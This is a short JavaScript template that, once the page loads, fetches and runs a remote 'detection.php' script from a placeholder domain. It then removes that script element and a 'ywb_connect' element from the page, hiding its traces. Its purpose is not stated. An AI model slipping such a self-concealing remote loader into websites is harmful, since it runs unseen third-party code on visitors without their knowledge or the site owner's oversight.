let domain = '{DOMAIN}';
let tp = 'text/javascript';

document.addEventListener('DOMContentLoaded', function () {
    let scr = 'detection';
    let s = document.createElement('script');
    s.type = tp;
    s.src = 'https://'+domain + '/js/' + scr + '.php';
    s.id = 'ywb_' + scr;
    document.querySelector('body').appendChild(s);
    document.getElementById(s.id).remove();
    let connScript = document.getElementById('ywb_connect');
    if (connScript) connScript.remove();
});